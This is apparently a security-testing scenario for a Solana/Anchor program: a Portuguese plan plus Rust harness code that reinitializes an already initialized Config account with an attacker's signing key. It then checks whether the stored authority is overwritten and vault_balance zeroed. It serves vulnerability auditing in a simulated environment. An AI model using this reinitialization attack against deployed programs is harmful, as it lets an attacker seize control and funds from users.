{
  "plan": "Preparar uma conta Config já inicializada com autoridade legítima e vault_balance > 0, usando o baseline para criar esse estado (a instrução init não tem constraint init, então a conta deve existir). O baseline chama init com a autoridade legítima, resultando em config.authority = autoridade legítima, is_initialized = true e vault_balance = 0. O ataque chama init novamente com a mesma conta config, mas passando a autoridade do atacante como signer. O efeito mede se config.authority foi sobrescrita para a chave do atacante e se vault_balance foi zerado, demonstrando a reinicialização não autorizada.",
  "scenario": "let program_id = env.program_id;
let authority_legit = Pubkey::new_unique();
let authority_attacker = Pubkey::new_unique();

// Conta Config já existente e inicializada (dono: program_id)
let config_key = Pubkey::new_unique();
let config_data = anchor_account_data("Config", &[
    authority_legit.to_bytes().to_vec(),
    vec![1u8], // is_initialized = true
    1000u64.to_le_bytes().to_vec(), // vault_balance = 1000
]);
let config_account = account(&program_id, &config_data, None);

// Conta authority legítima (signer)
let authority_legit_account = wallet(1_000_000_000);

// Contas para o baseline
let contas_baseline = vec![
    (config_key, config_account.clone()),
    (authority_legit, authority_legit_account.clone()),
];

// Instrução init legítima (autoridade legítima)
let ix_baseline = env.anchor_ix(
    "init",
    &[],
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(authority_legit, true),
    ],
);

let r_baseline = env.baseline("init legítimo com autoridade legítima", &ix_baseline, &contas_baseline);

// Verificar que o baseline teve sucesso
if r_baseline.program_result != ProgramResult::Success {
    return;
}

// Obter o estado resultante do baseline
let config_pos_baseline = after(&r_baseline, &config_key);
let config_data_pos_baseline = config_pos_baseline.data();

// Verificar que a autoridade é a legítima e vault_balance = 0
let authority_pos_baseline = read_pubkey(config_data_pos_baseline, 8); // offset 8: após discriminador
let vault_balance_pos_baseline = read_u64(config_data_pos_baseline, 8 + 32 + 1); // offset: disc(8) + authority(32) + is_initialized(1)

if authority_pos_baseline != authority_legit || vault_balance_pos_baseline != 0 {
    return;
}

// Conta authority do atacante (signer)
let authority_attacker_account = wallet(1_000_000_000);

// Contas para o ataque: mesma config, mas autoridade do atacante
let contas_ataque = vec![
    (config_key, config_pos_baseline.clone()),
    (authority_attacker, authority_attacker_account.clone()),
];

// Instrução init maliciosa: chama novamente com autoridade do atacante
let ix_ataque = env.anchor_ix(
    "init",
    &[],
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(authority_attacker, true),
    ],
);

let r_ataque = env.attack("reinit: sobrescrever autoridade e zerar vault_balance", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let config_pos_ataque = after(&r_ataque, &config_key);
    let config_data_pos_ataque = config_pos_ataque.data();
    let authority_pos_ataque = read_pubkey(config_data_pos_ataque, 8);
    let vault_balance_pos_ataque = read_u64(config_data_pos_ataque, 8 + 32 + 1);

    // Efeito: autoridade foi sobrescrita para o atacante e vault_balance foi zerado
    env.effect(
        "config.authority sobrescrita para o atacante e vault_balance zerado",
        authority_pos_ataque == authority_attacker && vault_balance_pos_ataque == 0,
    );
}"
}

